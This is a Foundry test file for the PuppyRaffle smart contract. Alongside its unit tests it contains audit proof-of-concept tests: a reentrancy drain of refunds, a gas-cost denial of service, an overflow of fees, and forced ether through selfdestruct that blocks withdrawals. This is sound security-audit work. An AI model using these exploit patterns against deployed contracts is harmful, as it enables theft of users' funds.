// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttacker} from "./mocks/ReentrancyAttacker.sol";
import {SelfDestructAttacker} from "./mocks/SelfDestructAttacker.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address playerFive = address(5);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    // POC `PuppyRafle::enterRaffle` DoS
    function test_audit_enterRaffle_DenialOfService() public {
        vm.txGasPrice(1);

        // Create 1st 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1);
        }

        // Calculate gas cost of entering raffle for 1st player
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasCostFirst = (gasBefore - gasAfter) * tx.gasprice;

        // Create 2nd 100 players
        address[] memory players2 = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players2[i] = address(i + 1 + playersNum);
        }

        // Calculate gas cost of entering raffle for 2nd player
        gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        gasAfter = gasleft();
        uint256 gasCostSecond = (gasBefore - gasAfter) * tx.gasprice;

        console2.log(gasCostFirst);
        console2.log(gasCostSecond);

        // 2nd player should pay more gas than 1st player
        assertGt(
            gasCostSecond,
            gasCostFirst,
            "2nd player should pay more gas than 1st player"
        );
    }

    function test_audit_refund_ExploitableWithReentrancy()
        public
        playersEntered
    {
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attacker).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Starting attacker contract balance: ",
            startingAttackerContractBalance
        );
        console2.log(
            "Starting PuppyRaffle balance: ",
            startingPuppyRaffleBalance
        );

        // Attack
        vm.prank(attackUser);
        attacker.attack{value: entranceFee}();

        uint256 endingAttackerContractBalance = address(attacker).balance;
        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Ending attacker contract balance: ",
            endingAttackerContractBalance
        );
        console2.log("Ending PuppyRaffle balance: ", endingPuppyRaffleBalance);

        assertEq(
            endingAttackerContractBalance - entranceFee,
            startingPuppyRaffleBalance,
            "Attacker contract balance should be equal to starting PuppyRaffle balance"
        );
    }

    function test_audit_selectWinner_TotalFeeVariableOverflows() public {
        uint256 playersNum = 92;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1);
        }

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        skip(duration + 1 minutes);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();

        playersNum = 4;
        players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1001);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        skip(duration + 1 minutes);
        puppyRaffle.selectWinner();
        uint256 endingTotalFees = puppyRaffle.totalFees();

        assertGt(
            startingTotalFees,
            endingTotalFees,
            "Total fees should be greater after 50 players"
        );
    }

    function test_audit_selectWinner_SelectsZeroAddressAsWinner() public {
        // Add 4 players
        uint256 playersNum = 4;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1);
        }

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        // Refund by all players
        for (uint256 i; i < playersNum; i++) {
            vm.prank(players[i]);
            puppyRaffle.refund(i);
        }

        // Select winner
        skip(duration + 1 minutes);
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }

    function test_audit_selectWinner_CalculatesTotalFundsAmountIncorrectly()
        public
    {
        // Setup
        uint256 expectedWinnerIndex = 1;
        uint256 playersNum = 8;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1);
        }

        // 8 players enter the raffle with 1 ETH each
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        // Player with index 0 calls the `refund` function
        vm.prank(players[0]);
        puppyRaffle.refund(0);

        // Duration of the raffle passes
        skip(duration + 1 minutes);
        uint256 winnerIndex = uint256(
            keccak256(
                abi.encodePacked(playerOne, block.timestamp, block.difficulty)
            )
        ) % playersNum;
        assertEq(winnerIndex, expectedWinnerIndex);

        uint256 winnerStartingBalance = players[winnerIndex].balance;

        // Player with index 1 calls the `selectWinner` function
        vm.prank(playerOne);
        puppyRaffle.selectWinner();
        uint256 winnerEndingBalance = players[winnerIndex].balance;
        uint256 winnerReward = winnerEndingBalance - winnerStartingBalance;

        uint256 entranceFeeForWinner = (entranceFee * 80) / 100;
        uint256 expectedWinnerPayout = entranceFeeForWinner * (playersNum - 1);
        uint256 totalFees = uint256(puppyRaffle.totalFees());

        // Assert winner reward
        console2.log("Winner reward: ", winnerReward);
        console2.log("Expected winner payout: ", expectedWinnerPayout);
        assertEq(winnerReward, expectedWinnerPayout + entranceFeeForWinner);

        // Assert total fees
        console2.log("Total fees: ", totalFees);
        console2.log("PuppyRaffle balance: ", address(puppyRaffle).balance);
        assertEq(totalFees, address(puppyRaffle).balance + entranceFee);
    }

    function test_audit_withdrawFees_AlwaysRevertsIfSelfdesctructTransferredFunds()
        public
        playersEntered
    {
        skip(duration + 1 minutes);
        vm.prank(playerOne);
        puppyRaffle.selectWinner();

        SelfDestructAttacker attacker = new SelfDestructAttacker{
            value: 1 ether
        }(address(puppyRaffle));

        // Withdraw fees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_audit_withdrawFees_TransfersZeroAmount() public {
        uint256 startingFeeAddressBalance = address(feeAddress).balance;
        puppyRaffle.withdrawFees();
        uint256 endingFeeAddressBalance = address(feeAddress).balance;

        assertEq(
            startingFeeAddressBalance,
            endingFeeAddressBalance,
            "Fee address balance should not change"
        );
    }
}
